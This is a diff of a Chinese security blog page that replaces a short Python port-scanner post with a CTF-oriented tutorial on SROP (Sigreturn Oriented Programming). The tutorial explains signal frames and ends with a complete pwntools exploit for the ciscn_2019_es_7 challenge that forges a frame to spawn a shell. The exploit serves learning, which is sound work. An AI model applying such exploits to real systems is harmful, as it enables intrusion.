@@ -1,8 +1,7 @@
 <!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="端口扫描脚本, Du4t~~~~">
-    <meta name="description" content="ReadmePython小工具第二弹???这次脚本终于优化了传参方式..使用了optparse这个库进行传参 具体的端口扫描功能实现是利用socket库实现的 中间排bug排的快死了..
-端口扫描脚本 V1.0# -*- coding: u">
+    <meta name="keywords" content="SROP技术详解, Du4t~~~~">
+    <meta name="description" content="SROP简介SROP全名是Sigreturn Oriented Programming 这个手法是在 2014年被Vrije Universiteit Amsterdam的Erik Bosman提出 这个手法最终利用的还是系统调用 即64位">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -10,7 +9,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>端口扫描脚本 | Du4t的博客</title>
+    <title>SROP技术详解 | Du4t的博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -301,13 +300,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        端口扫描脚本
+                        SROP技术详解
                     </div>
                 </div>
             </div>
@@ -419,8 +418,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Others/">
-                                <span class="chip bg-color">Others</span>
+                            <a href="/tags/PWN/">
+                                <span class="chip bg-color">PWN</span>
                             </a>
                         
                     </div>
@@ -431,8 +430,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Others/" class="post-category">
-                                Others
+                            <a href="/categories/PWN/" class="post-category">
+                                PWN
                             </a>
                         
                     </div>
@@ -443,21 +442,21 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:  
-                    2020-01-18
+                    2020-02-25
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="far fa-file-word fa-fw"></i>文章字数:  
-                        263
+                        1.5k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="far fa-clock fa-fw"></i>阅读时长:  
-                        1 分
+                        6 分
                     </div>
                     
                 
@@ -473,47 +472,136 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <meta name="generator" content="Hexo 3.9.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><h2 id="Readme"><a href="#Readme" class="headerlink" title="Readme"></a>Readme</h2><p>Python小工具第二弹???这次脚本终于优化了传参方式..使用了<code>optparse</code>这个库进行传参 具体的端口扫描功能实现是利用<code>socket</code>库实现的 中间排bug排的快死了..</p>
-<h2 id="端口扫描脚本-V1-0"><a href="#端口扫描脚本-V1-0" class="headerlink" title="端口扫描脚本 V1.0"></a>端口扫描脚本 V1.0</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
-<span class="token keyword">import</span> optparse
-<span class="token keyword">from</span> socket <span class="token keyword">import</span> <span class="token operator">*</span>
+                <meta name="generator" content="Hexo 3.9.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><h1 id="SROP简介"><a href="#SROP简介" class="headerlink" title="SROP简介"></a>SROP简介</h1><p>SROP全名是<code>Sigreturn Oriented Programming</code> 这个手法是在 2014年被Vrije Universiteit Amsterdam的Erik Bosman提出 这个手法最终利用的还是系统调用 即64位中的<code>syscall</code> 32位中的<code>int 80h</code></p>
+<h2 id="Signal"><a href="#Signal" class="headerlink" title="Signal"></a>Signal</h2><p>signal机制是类unix系统中进程之间相互传递信息的一种方法 也可以称其为软中断信号 一般来说信号机制常见的步骤是<br>1.内核向某个进程发送Signal机制 该进程会暂时挂起 进入内核态<br>2.内核为了以后恢复程序会为该进程保存现场 主要是将所有的寄存器压入栈 以及signal信息 然后将程序流向指向<code>Sigreturn</code>的系统调用地址 </p>
+<p>此时栈的情况如下:<br><img src="https://i.loli.net/2020/02/25/g5RVEJQbjmDNkda.png" alt></p>
+<p>通常我们称<code>ucontext</code>和<code>siginfo</code>这一部分为<code>Signal Frame</code> 注意 以上的所有信息都是在用户进程的地址空间 这里分别给出<code>Signal Frame</code>在32位和64位中的构造  </p>
+<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//X86</span>
+<span class="token keyword">struct</span> sigcontext
+<span class="token punctuation">{</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> gs<span class="token punctuation">,</span> __gsh<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> fs<span class="token punctuation">,</span> __fsh<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> es<span class="token punctuation">,</span> __esh<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> ds<span class="token punctuation">,</span> __dsh<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> edi<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> esi<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> ebp<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> esp<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> ebx<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> edx<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> ecx<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> eax<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> trapno<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> err<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> eip<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> cs<span class="token punctuation">,</span> __csh<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> eflags<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> esp_at_signal<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> ss<span class="token punctuation">,</span> __ssh<span class="token punctuation">;</span>
+  <span class="token keyword">struct</span> _fpstate <span class="token operator">*</span> fpstate<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> oldmask<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> cr2<span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
+<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//X64</span>
+<span class="token keyword">struct</span> _fpstate
+<span class="token punctuation">{</span>
+  <span class="token comment" spellcheck="true">/* FPU environment matching the 64-bit FXSAVE layout.  */</span>
+  __uint16_t        cwd<span class="token punctuation">;</span>
+  __uint16_t        swd<span class="token punctuation">;</span>
+  __uint16_t        ftw<span class="token punctuation">;</span>
+  __uint16_t        fop<span class="token punctuation">;</span>
+  __uint64_t        rip<span class="token punctuation">;</span>
+  __uint64_t        rdp<span class="token punctuation">;</span>
+  __uint32_t        mxcsr<span class="token punctuation">;</span>
+  __uint32_t        mxcr_mask<span class="token punctuation">;</span>
+  <span class="token keyword">struct</span> _fpxreg    _st<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token keyword">struct</span> _xmmreg    _xmm<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  __uint32_t        padding<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
 
-parser<span class="token operator">=</span>optparse<span class="token punctuation">.</span>OptionParser<span class="token punctuation">(</span><span class="token string">'usage %prog -H <target host> -P <target port>'</span><span class="token punctuation">)</span>
-parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-H'</span><span class="token punctuation">,</span>dest<span class="token operator">=</span><span class="token string">'tgthost'</span><span class="token punctuation">,</span>type<span class="token operator">=</span><span class="token string">'string'</span><span class="token punctuation">,</span>help<span class="token operator">=</span><span class="token string">'target host'</span><span class="token punctuation">)</span>
-parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-P'</span><span class="token punctuation">,</span>dest<span class="token operator">=</span><span class="token string">'tgtport'</span><span class="token punctuation">,</span>type<span class="token operator">=</span><span class="token string">'string'</span><span class="token punctuation">,</span>help<span class="token operator">=</span><span class="token string">'target host'</span><span class="token punctuation">)</span>
+<span class="token keyword">struct</span> sigcontext
+<span class="token punctuation">{</span>
+  __uint64_t r8<span class="token punctuation">;</span>
+  __uint64_t r9<span class="token punctuation">;</span>
+  __uint64_t r10<span class="token punctuation">;</span>
+  __uint64_t r11<span class="token punctuation">;</span>
+  __uint64_t r12<span class="token punctuation">;</span>
+  __uint64_t r13<span class="token punctuation">;</span>
+  __uint64_t r14<span class="token punctuation">;</span>
+  __uint64_t r15<span class="token punctuation">;</span>
+  __uint64_t rdi<span class="token punctuation">;</span>
+  __uint64_t rsi<span class="token punctuation">;</span>
+  __uint64_t rbp<span class="token punctuation">;</span>
+  __uint64_t rbx<span class="token punctuation">;</span>
+  __uint64_t rdx<span class="token punctuation">;</span>
+  __uint64_t rax<span class="token punctuation">;</span>
+  __uint64_t rcx<span class="token punctuation">;</span>
+  __uint64_t rsp<span class="token punctuation">;</span>
+  __uint64_t rip<span class="token punctuation">;</span>
+  __uint64_t eflags<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> cs<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> gs<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> fs<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> __pad0<span class="token punctuation">;</span>
+  __uint64_t err<span class="token punctuation">;</span>
+  __uint64_t trapno<span class="token punctuation">;</span>
+  __uint64_t oldmask<span class="token punctuation">;</span>
+  __uint64_t cr2<span class="token punctuation">;</span>
+  __extension__ <span class="token keyword">union</span>
+    <span class="token punctuation">{</span>
+      <span class="token keyword">struct</span> _fpstate <span class="token operator">*</span> fpstate<span class="token punctuation">;</span>
+      __uint64_t __fpstate_word<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">;</span>
+  __uint64_t __reserved1 <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
+<p>3.在执行完以上操作之后 程序会跳转到注册过的<code>signal handler</code>中处理响应的<code>signal</code> 在执行完<code>signal handler</code>后 根据程序流向便会执行<code>signerturn</code> 即恢复现场操作 恢复所有寄存器 最后恢复进程的执行 其中32位的<code>sigreturn</code>的系统调用号为77 64位的系统调用号为15</p>
+<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>其实从上文中<code>signal frame</code>存在用户进程的地址空间 就可以大致猜测出来攻击手法 那就是伪造一个<code>Signal Frame</code>出来<br>因为内核仅仅就是为进程保存现场和恢复现场 所有的变动都在<code>Signal Frame</code>中 也就是说 内核并不会为进程去记录<code>signal</code>对应的<code>Signal Frame</code> 所以当执行<code>sigreturn</code>系统调用的时候 并没有验证这个<code>Signal Frame</code>到底是内核为用户进程创造的还是用户伪造的 那么用户就完全有能力伪造一个<code>Signal Frame</code>出来 来控制所有的寄存器值和控制程序流向</p>
+<h2 id="相较于普通ROP的优势"><a href="#相较于普通ROP的优势" class="headerlink" title="相较于普通ROP的优势"></a>相较于普通ROP的优势</h2><p>说了上面那一堆原理 可能有些人会觉得SROP比一般的ROP深奥许多 毕竟涉及到内核和中断机制 用起来还不一定顺手 一般的ROP直接控制<code>ret</code> 便可以随意控制程序流向 但是通常来说普通ROP也需要很多条件<br>1.程序必须要有一个栈溢出漏洞<br>2.攻击者必须要有许多控制寄存器的gadget<br>3.攻击者需要在被攻击程序的进程地址空间中找到这些gadget并将其填在栈的合适位置上</p>
+<p>本身gadget就不是那么好找 再加上现在操作系统的保护机制 例如ASLR 让地址随机化 寻找到合适的gadgets地址就更难了 而且对于不同的程序 都需要有不同payload 精心构造出大量的gadgets 这也让ROP的payload复用性很差 所以SROP的出现就是为了解决以上这些问题</p>
+<p>因为其主要就是利用的<code>Signal Frame</code>可伪造这个机制 来控制各个寄存器的值而不需要去寻找大量的gadgets 同时也极大程度降低了ASLR对我们攻击的影响</p>
+<h1 id="Signal-Frame的构造"><a href="#Signal-Frame的构造" class="headerlink" title="Signal Frame的构造"></a>Signal Frame的构造</h1><p>虽然SROP相比起来原本ROP有着极大的优势 但是其最为繁琐的一点就是如何伪造<code>Signal Frame</code> 毕竟需要控制一堆寄存器的值 而没有办法直观的感受自己构造的<code>Signal Frame</code>到底是对是错 这里给出一个工具 是<code>pwntools</code>自带的<code>SigreturnFrame()</code>模块</p>
+<p>使用方法如下</p>
+<pre class=" language-python"><code class="language-python">
+<span class="token comment" spellcheck="true"># arch如果是64位系统填入amd64 32为填入i386</span>
+frame<span class="token operator">=</span>SigreturnFrame<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true"># 例如 frame.rax=0x3b</span>
+frame<span class="token punctuation">.</span>寄存器<span class="token operator">=</span>相对应的值</code></pre>
+<p>有了这个工具 那么使用SROP便再无障碍 只要程序存在一个栈溢出便可以进行SROP而不用费心的寻找各种gadgets</p>
+<h1 id="利用SROP来GetShell"><a href="#利用SROP来GetShell" class="headerlink" title="利用SROP来GetShell"></a>利用SROP来GetShell</h1><p>这里借用的测试样例是CTF比赛中的一道题<code>ciscn_2019_es_7</code>来讲解 </p>
+<p><img src="https://i.loli.net/2020/02/25/3o46GMJrihpfAs9.png" alt></p>
+<p>主程序就这两个系统调用 函数表中没有其他的可利用函数 主要是利用函数的start_addr来泄漏出来栈的地址且控制程序重新返回主函数 再利用SROP来进行getshell 因为想要使用<code>syscall</code>来开启一个shell的话 需要保证RAX的值是59 RDI的值是<code>/bin/sh\x00</code>的地址 而ESI和RDX都需要保证为0 因为RAX和RDX像这样的通用寄存器 很难控制值 所以此时采用SROP控制所有寄存器的值来保证shell的正常开启</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
+sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>
+pop_eax_0x3b<span class="token operator">=</span><span class="token number">0x00000000004004e3</span>
+pop_rdi<span class="token operator">=</span><span class="token number">0x00000000004005a3</span>
+pop_eax_0xf<span class="token operator">=</span><span class="token number">0x00000000004004da</span>
+syscall<span class="token operator">=</span><span class="token number">0x0000000000400501</span>
+start_addr<span class="token operator">=</span><span class="token number">0x4004ED</span>
+pop_rbx_rbp_r12_r13_r14_r15<span class="token operator">=</span><span class="token number">0x40059A</span>
+pop_rsi_r15<span class="token operator">=</span><span class="token number">0x00000000004005a1</span>
 
-<span class="token punctuation">(</span>option<span class="token punctuation">,</span>args<span class="token punctuation">)</span><span class="token operator">=</span>parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
-tgthost<span class="token operator">=</span>option<span class="token punctuation">.</span>tgthost
-tgtport<span class="token operator">=</span>option<span class="token punctuation">.</span>tgtport
+payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 
-<span class="token keyword">if</span><span class="token punctuation">(</span>tgthost<span class="token operator">==</span>None<span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span>tgtport<span class="token operator">==</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span>parser<span class="token punctuation">.</span>usage<span class="token punctuation">)</span>
-    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">)</span>
+bin_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x18</span><span class="token operator">+</span><span class="token number">0x8</span><span class="token operator">-</span><span class="token number">0x100</span>
+log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"bin_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>bin_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
 
-<span class="token comment" spellcheck="true"># 解析IP</span>
-<span class="token keyword">try</span><span class="token punctuation">:</span>
-    tgtip<span class="token operator">=</span>gethostbyname<span class="token punctuation">(</span>tgthost<span class="token punctuation">)</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]解析IP为:%s"</span><span class="token operator">%</span>tgtip<span class="token punctuation">)</span>
-<span class="token keyword">except</span><span class="token punctuation">:</span>
-    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+frameExecve <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>
+frameExecve<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">0x3b</span>
+frameExecve<span class="token punctuation">.</span>rdi <span class="token operator">=</span> bin_addr
+frameExecve<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0</span>
+frameExecve<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0</span>
+frameExecve<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall
 
-<span class="token comment" spellcheck="true"># 分割端口 开始扫描</span>
-tgtport<span class="token operator">=</span>str<span class="token punctuation">(</span>option<span class="token punctuation">.</span>tgtport<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>
-<span class="token keyword">for</span> tgtp <span class="token keyword">in</span> tgtport<span class="token punctuation">:</span>  
-    <span class="token keyword">try</span><span class="token punctuation">:</span>
-        con<span class="token operator">=</span>socket<span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span>SOCK_STREAM<span class="token punctuation">)</span>
-        con<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-        con<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>tgtip<span class="token punctuation">,</span>int<span class="token punctuation">(</span>tgtp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-        con<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'Du4t\n'</span><span class="token punctuation">)</span>
-        result<span class="token operator">=</span>con<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>
-        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]"</span><span class="token operator">+</span>tgtp<span class="token operator">+</span><span class="token string">"端口开放"</span><span class="token punctuation">)</span>
-        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]"</span><span class="token operator">+</span>tgtp<span class="token operator">+</span><span class="token string">"端口响应:\n"</span><span class="token operator">+</span>result<span class="token punctuation">)</span>
-        con<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token keyword">except</span><span class="token punctuation">:</span>
-        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-]"</span><span class="token operator">+</span>tgtp<span class="token operator">+</span><span class="token string">"端口未开放"</span><span class="token punctuation">)</span></code></pre>
-<h2 id="ToDoList"><a href="#ToDoList" class="headerlink" title="ToDoList"></a>ToDoList</h2><ul>
-<li>多线程</li>
-</ul>
+payload2<span class="token operator">=</span>p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_eax_0xf<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span><span class="token operator">+</span>str<span class="token punctuation">(</span>frameExecve<span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -690,8 +778,8 @@ tgtport<span class="token operator">=</span>str<span class="token punctuation">(
                 </a>
             </div>
             <br>
-            <a href="/2020/01/18/duan-kou-sao-miao-jiao-ben/">
-                    《端口扫描脚本》
+            <a href="/2020/02/25/srop-ji-zhu-xiang-jie/">
+                    《SROP技术详解》
             </a> 由
             <a href="http://Du4t.github.io">
                 Du4t
@@ -734,29 +822,28 @@ tgtport<span class="token operator">=</span>str<span class="token punctuation">(
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i> 上一篇</div>
+                <i class="fas fa-chevron-left"></i> 本篇
+            </div>
             <div class="card">
-                <a href="/2020/01/23/how2heap-xue-xi-bi-ji/">
+                <a href="/2020/02/25/srop-ji-zhu-xiang-jie/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="how2heap学习笔记">
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="SROP技术详解">
                         
-                        <span class="card-title">how2heap学习笔记</span>
+                        <span class="card-title">SROP技术详解</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            堆的基础知识堆是如何分配的在内存中堆有两种分配方式 一种是mmap另外一种是brk 这两者的区别是
-mmap:是当申请的堆块size>128kb时 使用mmap分配brk:是当申请的堆块size
-#include <string.h>
+                            SROP简介SROP全名是Sigreturn Oriented Programming 这个手法是在 2014年被Vrije Universiteit Amsterdam的Erik Bosman提出 这个手法最终利用的还是系统调用 即64位
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-01-23
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-02-25
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -769,6 +856,7 @@ mmap:是当申请的堆块size>128kb时 使用mmap分配brk:是当申请的堆�
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -787,31 +875,31 @@ mmap:是当申请的堆块size>128kb时 使用mmap分配brk:是当申请的堆�
                 下一篇 <i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/01/14/zip-bao-po/">
+                <a href="/2020/02/14/ji-yu-zhan-yi-chu-de-ret2syscall-xue-xi/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="ZIP爆破脚本">
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="基于栈溢出的ret2syscall学习">
                         
-                        <span class="card-title">ZIP爆破脚本</span>
+                        <span class="card-title">基于栈溢出的ret2syscall学习</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            Readme也是最近刚放假 打算写几个常用的小工具 一个是丰富自己的实战经验 另外一个也是为了划水摸鱼吧… 所以就先写了个爆破ZIP密码的小工具 整体代码效率应该还是较低的..毕竟我也只是线性的直接写下来..多线程的话现在也是刚接触..打算
+                            最近终于考完了难熬的期末考试 终于有时间整理下这半年学习的东西了 关于栈溢出系统调用的知识其实一直都是一知半解 仅限于能勉强用起来 具体的原理还是不是很了解 这里也是系统的学习一下这个栈溢出的利用手法 主要还是借鉴CTFWiki的知识进行的
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-01-14
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-02-14
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Others/" class="post-category">
-                                    Others
+                            <a href="/categories/PWN/" class="post-category">
+                                    PWN
                                 </a>
                             
                             
@@ -821,8 +909,8 @@ mmap:是当申请的堆块size>128kb时 使用mmap分配brk:是当申请的堆�
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Others/">
-                        <span class="chip bg-color">Others</span>
+                    <a href="/tags/PWN/">
+                        <span class="chip bg-color">PWN</span>
                     </a>
                     
                 </div>
